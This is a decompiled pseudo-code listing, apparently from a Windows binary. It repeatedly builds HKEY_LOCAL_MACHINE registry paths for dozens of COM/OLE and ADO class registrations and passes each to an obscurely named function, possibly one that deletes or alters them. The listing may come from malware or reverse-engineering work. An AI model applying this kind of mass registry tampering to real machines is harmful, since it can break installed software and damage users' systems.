  loc_00456788: call var_BDBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000108-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456794: var_BDC0 = OnudaSilloA(global_80000002, var_BDBC)
  loc_00456799: call var_BDC4 = global_00401054
  loc_004567A2: call var_BDC8 = global_004011CC
  loc_004567B8: call var_BDCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000108-0000-0010-8000-00AA006D2EA4}")
  loc_004567C4: var_BDD0 = OnudaSilloA(global_80000002, var_BDCC)
  loc_004567C9: call var_BDD4 = global_00401054
  loc_004567D2: call var_BDD8 = global_004011CC
  loc_004567E8: call var_BDDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000109-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004567F4: var_BDE0 = OnudaSilloA(global_80000002, var_BDDC)
  loc_004567F9: call var_BDE4 = global_00401054
  loc_00456802: call var_BDE8 = global_004011CC
  loc_00456818: call var_BDEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000109-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456824: var_BDF0 = OnudaSilloA(global_80000002, var_BDEC)
  loc_00456829: call var_BDF4 = global_00401054
  loc_00456832: call var_BDF8 = global_004011CC
  loc_00456848: call var_BDFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000109-0000-0010-8000-00AA006D2EA4}")
  loc_00456854: var_BE00 = OnudaSilloA(global_80000002, var_BDFC)
  loc_00456859: call var_BE04 = global_00401054
  loc_00456862: call var_BE08 = global_004011CC
  loc_00456878: call var_BE0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000300-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456884: var_BE10 = OnudaSilloA(global_80000002, var_BE0C)
  loc_00456889: call var_BE14 = global_00401054
  loc_00456892: call var_BE18 = global_004011CC
  loc_004568A8: call var_BE1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000300-0000-0000-C000-000000000046}")
  loc_004568B4: var_BE20 = OnudaSilloA(global_80000002, var_BE1C)
  loc_004568B9: call var_BE24 = global_00401054
  loc_004568C2: call var_BE28 = global_004011CC
  loc_004568D8: call var_BE2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000303-0000-0000-C000-000000000046}\InprocServer32")
  loc_004568E4: var_BE30 = OnudaSilloA(global_80000002, var_BE2C)
  loc_004568E9: call var_BE34 = global_00401054
  loc_004568F2: call var_BE38 = global_004011CC
  loc_00456908: call var_BE3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000303-0000-0000-C000-000000000046}\ProgID")
  loc_00456914: var_BE40 = OnudaSilloA(global_80000002, var_BE3C)
  loc_00456919: call var_BE44 = global_00401054
  loc_00456922: call var_BE48 = global_004011CC
  loc_00456938: call var_BE4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000303-0000-0000-C000-000000000046}")
  loc_00456944: var_BE50 = OnudaSilloA(global_80000002, var_BE4C)
  loc_00456949: call var_BE54 = global_00401054
  loc_00456952: call var_BE58 = global_004011CC
  loc_00456968: call var_BE5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000304-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456974: var_BE60 = OnudaSilloA(global_80000002, var_BE5C)
  loc_00456979: call var_BE64 = global_00401054
  loc_00456982: call var_BE68 = global_004011CC
  loc_00456998: call var_BE6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000304-0000-0000-C000-000000000046}")
  loc_004569A4: var_BE70 = OnudaSilloA(global_80000002, var_BE6C)
  loc_004569A9: call var_BE74 = global_00401054
  loc_004569B2: call var_BE78 = global_004011CC
  loc_004569C8: call var_BE7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000305-0000-0000-C000-000000000046}\InprocServer32")
  loc_004569D4: var_BE80 = OnudaSilloA(global_80000002, var_BE7C)
  loc_004569D9: call var_BE84 = global_00401054
  loc_004569E2: call var_BE88 = global_004011CC
  loc_004569F8: call var_BE8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000305-0000-0000-C000-000000000046}")
  loc_00456A04: var_BE90 = OnudaSilloA(global_80000002, var_BE8C)
  loc_00456A09: call var_BE94 = global_00401054
  loc_00456A12: call var_BE98 = global_004011CC
  loc_00456A28: call var_BE9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000306-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456A34: var_BEA0 = OnudaSilloA(global_80000002, var_BE9C)
  loc_00456A39: call var_BEA4 = global_00401054
  loc_00456A42: call var_BEA8 = global_004011CC
  loc_00456A58: call var_BEAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000306-0000-0000-C000-000000000046}")
  loc_00456A64: var_BEB0 = OnudaSilloA(global_80000002, var_BEAC)
  loc_00456A69: call var_BEB4 = global_00401054
  loc_00456A72: call var_BEB8 = global_004011CC
  loc_00456A88: call var_BEBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000308-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456A94: var_BEC0 = OnudaSilloA(global_80000002, var_BEBC)
  loc_00456A99: call var_BEC4 = global_00401054
  loc_00456AA2: call var_BEC8 = global_004011CC
  loc_00456AB8: call var_BECC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000308-0000-0000-C000-000000000046}")
  loc_00456AC4: var_BED0 = OnudaSilloA(global_80000002, var_BECC)
  loc_00456AC9: call var_BED4 = global_00401054
  loc_00456AD2: call var_BED8 = global_004011CC
  loc_00456AE8: call var_BEDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000309-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456AF4: var_BEE0 = OnudaSilloA(global_80000002, var_BEDC)
  loc_00456AF9: call var_BEE4 = global_00401054
  loc_00456B02: call var_BEE8 = global_004011CC
  loc_00456B18: call var_BEEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000309-0000-0000-C000-000000000046}")
  loc_00456B24: var_BEF0 = OnudaSilloA(global_80000002, var_BEEC)
  loc_00456B29: call var_BEF4 = global_00401054
  loc_00456B32: call var_BEF8 = global_004011CC
  loc_00456B48: call var_BEFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000030B-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456B54: var_BF00 = OnudaSilloA(global_80000002, var_BEFC)
  loc_00456B59: call var_BF04 = global_00401054
  loc_00456B62: call var_BF08 = global_004011CC
  loc_00456B78: call var_BF0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000030B-0000-0000-C000-000000000046}")
  loc_00456B84: var_BF10 = OnudaSilloA(global_80000002, var_BF0C)
  loc_00456B89: call var_BF14 = global_00401054
  loc_00456B92: call var_BF18 = global_004011CC
  loc_00456BA8: call var_BF1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\AuxUserType\2")
  loc_00456BB4: var_BF20 = OnudaSilloA(global_80000002, var_BF1C)
  loc_00456BB9: call var_BF24 = global_00401054
  loc_00456BC2: call var_BF28 = global_004011CC
  loc_00456BD8: call var_BF2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\AuxUserType")
  loc_00456BE4: var_BF30 = OnudaSilloA(global_80000002, var_BF2C)
  loc_00456BE9: call var_BF34 = global_00401054
  loc_00456BF2: call var_BF38 = global_004011CC
  loc_00456C08: call var_BF3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\Conversion\Readable\Main")
  loc_00456C14: var_BF40 = OnudaSilloA(global_80000002, var_BF3C)
  loc_00456C19: call var_BF44 = global_00401054
  loc_00456C22: call var_BF48 = global_004011CC
  loc_00456C38: call var_BF4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\Conversion\Readable")
  loc_00456C44: var_BF50 = OnudaSilloA(global_80000002, var_BF4C)
  loc_00456C49: call var_BF54 = global_00401054
  loc_00456C52: call var_BF58 = global_004011CC
  loc_00456C68: call var_BF5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\Conversion")
  loc_00456C74: var_BF60 = OnudaSilloA(global_80000002, var_BF5C)
  loc_00456C79: call var_BF64 = global_00401054
  loc_00456C82: call var_BF68 = global_004011CC
  loc_00456C98: call var_BF6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats\GetSet\0")
  loc_00456CA4: var_BF70 = OnudaSilloA(global_80000002, var_BF6C)
  loc_00456CA9: call var_BF74 = global_00401054
  loc_00456CB2: call var_BF78 = global_004011CC
  loc_00456CC8: call var_BF7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats\GetSet")
  loc_00456CD4: var_BF80 = OnudaSilloA(global_80000002, var_BF7C)
  loc_00456CD9: call var_BF84 = global_00401054
  loc_00456CE2: call var_BF88 = global_004011CC
  loc_00456CF8: call var_BF8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats\DefaultFile")
  loc_00456D04: var_BF90 = OnudaSilloA(global_80000002, var_BF8C)
  loc_00456D09: call var_BF94 = global_00401054
  loc_00456D12: call var_BF98 = global_004011CC
  loc_00456D28: call var_BF9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats")
  loc_00456D34: var_BFA0 = OnudaSilloA(global_80000002, var_BF9C)
  loc_00456D39: call var_BFA4 = global_00401054
  loc_00456D42: call var_BFA8 = global_004011CC
  loc_00456D58: call var_BFAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456D64: var_BFB0 = OnudaSilloA(global_80000002, var_BFAC)
  loc_00456D69: call var_BFB4 = global_00401054
  loc_00456D72: call var_BFB8 = global_004011CC
  loc_00456D88: call var_BFBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\MiscStatus")
  loc_00456D94: var_BFC0 = OnudaSilloA(global_80000002, var_BFBC)
  loc_00456D99: call var_BFC4 = global_00401054
  loc_00456DA2: call var_BFC8 = global_004011CC
  loc_00456DB8: call var_BFCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\ProgID")
  loc_00456DC4: var_BFD0 = OnudaSilloA(global_80000002, var_BFCC)
  loc_00456DC9: call var_BFD4 = global_00401054
  loc_00456DD2: call var_BFD8 = global_004011CC
  loc_00456DE8: call var_BFDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}")
  loc_00456DF4: var_BFE0 = OnudaSilloA(global_80000002, var_BFDC)
  loc_00456DF9: call var_BFE4 = global_00401054
  loc_00456E02: call var_BFE8 = global_004011CC
  loc_00456E18: call var_BFEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\ProgID")
  loc_00456E24: var_BFF0 = OnudaSilloA(global_80000002, var_BFEC)
  loc_00456E29: call var_BFF4 = global_00401054
  loc_00456E32: call var_BFF8 = global_004011CC
  loc_00456E48: call var_BFFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456E54: var_C000 = OnudaSilloA(global_80000002, var_BFFC)
  loc_00456E59: call var_C004 = global_00401054
  loc_00456E62: call var_C008 = global_004011CC
  loc_00456E78: call var_C00C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats\GetSet\0")
  loc_00456E84: var_C010 = OnudaSilloA(global_80000002, var_C00C)
  loc_00456E89: call var_C014 = global_00401054
  loc_00456E92: call var_C018 = global_004011CC
  loc_00456EA8: call var_C01C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats\GetSet")
  loc_00456EB4: var_C020 = OnudaSilloA(global_80000002, var_C01C)
  loc_00456EB9: call var_C024 = global_00401054
  loc_00456EC2: call var_C028 = global_004011CC
  loc_00456ED8: call var_C02C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats\DefaultFile")
  loc_00456EE4: var_C030 = OnudaSilloA(global_80000002, var_C02C)
  loc_00456EE9: call var_C034 = global_00401054
  loc_00456EF2: call var_C038 = global_004011CC
  loc_00456F08: call var_C03C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats")
  loc_00456F14: var_C040 = OnudaSilloA(global_80000002, var_C03C)
  loc_00456F19: call var_C044 = global_00401054
  loc_00456F22: call var_C048 = global_004011CC
  loc_00456F38: call var_C04C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\Conversion\Readable\Main")
  loc_00456F44: var_C050 = OnudaSilloA(global_80000002, var_C04C)
  loc_00456F49: call var_C054 = global_00401054
  loc_00456F52: call var_C058 = global_004011CC
  loc_00456F68: call var_C05C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\Conversion\Readable")
  loc_00456F74: var_C060 = OnudaSilloA(global_80000002, var_C05C)
  loc_00456F79: call var_C064 = global_00401054
  loc_00456F82: call var_C068 = global_004011CC
  loc_00456F98: call var_C06C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\Conversion")
  loc_00456FA4: var_C070 = OnudaSilloA(global_80000002, var_C06C)
  loc_00456FA9: call var_C074 = global_00401054
  loc_00456FB2: call var_C078 = global_004011CC
  loc_00456FC8: call var_C07C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\AuxUserType\2")
  loc_00456FD4: var_C080 = OnudaSilloA(global_80000002, var_C07C)
  loc_00456FD9: call var_C084 = global_00401054
  loc_00456FE2: call var_C088 = global_004011CC
  loc_00456FF8: call var_C08C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\AuxUserType")
  loc_00457004: var_C090 = OnudaSilloA(global_80000002, var_C08C)
  loc_00457009: call var_C094 = global_00401054
  loc_00457012: call var_C098 = global_004011CC
  loc_00457028: call var_C09C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}")
  loc_00457034: var_C0A0 = OnudaSilloA(global_80000002, var_C09C)
  loc_00457039: call var_C0A4 = global_00401054
  loc_00457042: call var_C0A8 = global_004011CC
  loc_00457058: call var_C0AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\ProgID")
  loc_00457064: var_C0B0 = OnudaSilloA(global_80000002, var_C0AC)
  loc_00457069: call var_C0B4 = global_00401054
  loc_00457072: call var_C0B8 = global_004011CC
  loc_00457088: call var_C0BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\InprocServer32")
  loc_00457094: var_C0C0 = OnudaSilloA(global_80000002, var_C0BC)
  loc_00457099: call var_C0C4 = global_00401054
  loc_004570A2: call var_C0C8 = global_004011CC
  loc_004570B8: call var_C0CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats\GetSet\0")
  loc_004570C4: var_C0D0 = OnudaSilloA(global_80000002, var_C0CC)
  loc_004570C9: call var_C0D4 = global_00401054
  loc_004570D2: call var_C0D8 = global_004011CC
  loc_004570E8: call var_C0DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats\GetSet")
  loc_004570F4: var_C0E0 = OnudaSilloA(global_80000002, var_C0DC)
  loc_004570F9: call var_C0E4 = global_00401054
  loc_00457102: call var_C0E8 = global_004011CC
  loc_00457118: call var_C0EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats\DefaultFile")
  loc_00457124: var_C0F0 = OnudaSilloA(global_80000002, var_C0EC)
  loc_00457129: call var_C0F4 = global_00401054
  loc_00457132: call var_C0F8 = global_004011CC
  loc_00457148: call var_C0FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats")
  loc_00457154: var_C100 = OnudaSilloA(global_80000002, var_C0FC)
  loc_00457159: call var_C104 = global_00401054
  loc_00457162: call var_C108 = global_004011CC
  loc_00457178: call var_C10C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\Conversion\Readable\Main")
  loc_00457184: var_C110 = OnudaSilloA(global_80000002, var_C10C)
  loc_00457189: call var_C114 = global_00401054
  loc_00457192: call var_C118 = global_004011CC
  loc_004571A8: call var_C11C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\Conversion\Readable")
  loc_004571B4: var_C120 = OnudaSilloA(global_80000002, var_C11C)
  loc_004571B9: call var_C124 = global_00401054
  loc_004571C2: call var_C128 = global_004011CC
  loc_004571D8: call var_C12C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\Conversion")
  loc_004571E4: var_C130 = OnudaSilloA(global_80000002, var_C12C)
  loc_004571E9: call var_C134 = global_00401054
  loc_004571F2: call var_C138 = global_004011CC
  loc_00457208: call var_C13C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\AuxUserType\2")
  loc_00457214: var_C140 = OnudaSilloA(global_80000002, var_C13C)
  loc_00457219: call var_C144 = global_00401054
  loc_00457222: call var_C148 = global_004011CC
  loc_00457238: call var_C14C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\AuxUserType")
  loc_00457244: var_C150 = OnudaSilloA(global_80000002, var_C14C)
  loc_00457249: call var_C154 = global_00401054
  loc_00457252: call var_C158 = global_004011CC
  loc_00457268: call var_C15C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}")
  loc_00457274: var_C160 = OnudaSilloA(global_80000002, var_C15C)
  loc_00457279: call var_C164 = global_00401054
  loc_00457282: call var_C168 = global_004011CC
  loc_00457298: call var_C16C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000031A-0000-0000-C000-000000000046}\ProgID")
  loc_004572A4: var_C170 = OnudaSilloA(global_80000002, var_C16C)
  loc_004572A9: call var_C174 = global_00401054
  loc_004572B2: call var_C178 = global_004011CC
  loc_004572C8: call var_C17C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000031A-0000-0000-C000-000000000046}\InprocServer32")
  loc_004572D4: var_C180 = OnudaSilloA(global_80000002, var_C17C)
  loc_004572D9: call var_C184 = global_00401054
  loc_004572E2: call var_C188 = global_004011CC
  loc_004572F8: call var_C18C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000031A-0000-0000-C000-000000000046}")
  loc_00457304: var_C190 = OnudaSilloA(global_80000002, var_C18C)
  loc_00457309: call var_C194 = global_00401054
  loc_00457312: call var_C198 = global_004011CC
  loc_00457328: call var_C19C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000031D-0000-0000-C000-000000000046}\InProcServer32")
  loc_00457334: var_C1A0 = OnudaSilloA(global_80000002, var_C19C)
  loc_00457339: call var_C1A4 = global_00401054
  loc_00457342: call var_C1A8 = global_004011CC
  loc_00457358: call var_C1AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000031D-0000-0000-C000-000000000046}")
  loc_00457364: var_C1B0 = OnudaSilloA(global_80000002, var_C1AC)
  loc_00457369: call var_C1B4 = global_00401054
  loc_00457372: call var_C1B8 = global_004011CC
  loc_00457388: call var_C1BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000320-0000-0000-C000-000000000046}\InprocServer32")
  loc_00457394: var_C1C0 = OnudaSilloA(global_80000002, var_C1BC)
  loc_00457399: call var_C1C4 = global_00401054
  loc_004573A2: call var_C1C8 = global_004011CC
  loc_004573B8: call var_C1CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000320-0000-0000-C000-000000000046}")
  loc_004573C4: var_C1D0 = OnudaSilloA(global_80000002, var_C1CC)
  loc_004573C9: call var_C1D4 = global_00401054
  loc_004573D2: call var_C1D8 = global_004011CC
  loc_004573E8: call var_C1DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000327-0000-0000-C000-000000000046}\ProgID")
  loc_004573F4: var_C1E0 = OnudaSilloA(global_80000002, var_C1DC)
  loc_004573F9: call var_C1E4 = global_00401054
  loc_00457402: call var_C1E8 = global_004011CC
  loc_00457418: call var_C1EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000327-0000-0000-C000-000000000046}\InprocServer32")
  loc_00457424: var_C1F0 = OnudaSilloA(global_80000002, var_C1EC)
  loc_00457429: call var_C1F4 = global_00401054
  loc_00457432: call var_C1F8 = global_004011CC
  loc_00457448: call var_C1FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000327-0000-0000-C000-000000000046}")
  loc_00457454: var_C200 = OnudaSilloA(global_80000002, var_C1FC)
  loc_00457459: call var_C204 = global_00401054
  loc_00457462: call var_C208 = global_004011CC
  loc_00457478: call var_C20C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000032E-0000-0000-C000-000000000046}\InprocServer32")
  loc_00457484: var_C210 = OnudaSilloA(global_80000002, var_C20C)
  loc_00457489: call var_C214 = global_00401054
  loc_00457492: call var_C218 = global_004011CC
  loc_004574A8: call var_C21C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000032E-0000-0000-C000-000000000046}")
  loc_004574B4: var_C220 = OnudaSilloA(global_80000002, var_C21C)
  loc_004574B9: call var_C224 = global_00401054
  loc_004574C2: call var_C228 = global_004011CC
  loc_004574D8: call var_C22C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_004574E4: var_C230 = OnudaSilloA(global_80000002, var_C22C)
  loc_004574E9: call var_C234 = global_00401054
  loc_004574F2: call var_C238 = global_004011CC
  loc_00457508: call var_C23C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457514: var_C240 = OnudaSilloA(global_80000002, var_C23C)
  loc_00457519: call var_C244 = global_00401054
  loc_00457522: call var_C248 = global_004011CC
  loc_00457538: call var_C24C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457544: var_C250 = OnudaSilloA(global_80000002, var_C24C)
  loc_00457549: call var_C254 = global_00401054
  loc_00457552: call var_C258 = global_004011CC
  loc_00457568: call var_C25C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}")
  loc_00457574: var_C260 = OnudaSilloA(global_80000002, var_C25C)
  loc_00457579: call var_C264 = global_00401054
  loc_00457582: call var_C268 = global_004011CC
  loc_00457598: call var_C26C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_004575A4: var_C270 = OnudaSilloA(global_80000002, var_C26C)
  loc_004575A9: call var_C274 = global_00401054
  loc_004575B2: call var_C278 = global_004011CC
  loc_004575C8: call var_C27C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004575D4: var_C280 = OnudaSilloA(global_80000002, var_C27C)
  loc_004575D9: call var_C284 = global_00401054
  loc_004575E2: call var_C288 = global_004011CC
  loc_004575F8: call var_C28C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457604: var_C290 = OnudaSilloA(global_80000002, var_C28C)
  loc_00457609: call var_C294 = global_00401054
  loc_00457612: call var_C298 = global_004011CC
  loc_00457628: call var_C29C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}")
  loc_00457634: var_C2A0 = OnudaSilloA(global_80000002, var_C29C)
  loc_00457639: call var_C2A4 = global_00401054
  loc_00457642: call var_C2A8 = global_004011CC
  loc_00457658: call var_C2AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457664: var_C2B0 = OnudaSilloA(global_80000002, var_C2AC)
  loc_00457669: call var_C2B4 = global_00401054
  loc_00457672: call var_C2B8 = global_004011CC
  loc_00457688: call var_C2BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457694: var_C2C0 = OnudaSilloA(global_80000002, var_C2BC)
  loc_00457699: call var_C2C4 = global_00401054
  loc_004576A2: call var_C2C8 = global_004011CC
  loc_004576B8: call var_C2CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_004576C4: var_C2D0 = OnudaSilloA(global_80000002, var_C2CC)
  loc_004576C9: call var_C2D4 = global_00401054
  loc_004576D2: call var_C2D8 = global_004011CC
  loc_004576E8: call var_C2DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}")
  loc_004576F4: var_C2E0 = OnudaSilloA(global_80000002, var_C2DC)
  loc_004576F9: call var_C2E4 = global_00401054
  loc_00457702: call var_C2E8 = global_004011CC
  loc_00457718: call var_C2EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000051A-0000-0010-8000-00AA006D2EA4}\ExtendedErrors\{00000542-0000-0010-8000-00AA006D2EA4}")
  loc_00457724: var_C2F0 = OnudaSilloA(global_80000002, var_C2EC)
  loc_00457729: call var_C2F4 = global_00401054
  loc_00457732: call var_C2F8 = global_004011CC
  loc_00457748: call var_C2FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000051A-0000-0010-8000-00AA006D2EA4}\ExtendedErrors")
  loc_00457754: var_C300 = OnudaSilloA(global_80000002, var_C2FC)
  loc_00457759: call var_C304 = global_00401054
  loc_00457762: call var_C308 = global_004011CC
  loc_00457778: call var_C30C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000051A-0000-0010-8000-00AA006D2EA4}")
  loc_00457784: var_C310 = OnudaSilloA(global_80000002, var_C30C)
  loc_00457789: call var_C314 = global_00401054
  loc_00457792: call var_C318 = global_004011CC
  loc_004577A8: call var_C31C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_004577B4: var_C320 = OnudaSilloA(global_80000002, var_C31C)
  loc_004577B9: call var_C324 = global_00401054
  loc_004577C2: call var_C328 = global_004011CC
  loc_004577D8: call var_C32C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004577E4: var_C330 = OnudaSilloA(global_80000002, var_C32C)
  loc_004577E9: call var_C334 = global_00401054
  loc_004577F2: call var_C338 = global_004011CC
  loc_00457808: call var_C33C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457814: var_C340 = OnudaSilloA(global_80000002, var_C33C)
  loc_00457819: call var_C344 = global_00401054
  loc_00457822: call var_C348 = global_004011CC
  loc_00457838: call var_C34C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}")
  loc_00457844: var_C350 = OnudaSilloA(global_80000002, var_C34C)
  loc_00457849: call var_C354 = global_00401054
  loc_00457852: call var_C358 = global_004011CC
  loc_00457868: call var_C35C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457874: var_C360 = OnudaSilloA(global_80000002, var_C35C)
  loc_00457879: call var_C364 = global_00401054
  loc_00457882: call var_C368 = global_004011CC
  loc_00457898: call var_C36C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004578A4: var_C370 = OnudaSilloA(global_80000002, var_C36C)
  loc_004578A9: call var_C374 = global_00401054
  loc_004578B2: call var_C378 = global_004011CC
  loc_004578C8: call var_C37C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_004578D4: var_C380 = OnudaSilloA(global_80000002, var_C37C)
  loc_004578D9: call var_C384 = global_00401054
  loc_004578E2: call var_C388 = global_004011CC
  loc_004578F8: call var_C38C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}")
  loc_00457904: var_C390 = OnudaSilloA(global_80000002, var_C38C)
  loc_00457909: call var_C394 = global_00401054
  loc_00457912: call var_C398 = global_004011CC
  loc_00457928: call var_C39C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457934: var_C3A0 = OnudaSilloA(global_80000002, var_C39C)
  loc_00457939: call var_C3A4 = global_00401054
  loc_00457942: call var_C3A8 = global_004011CC
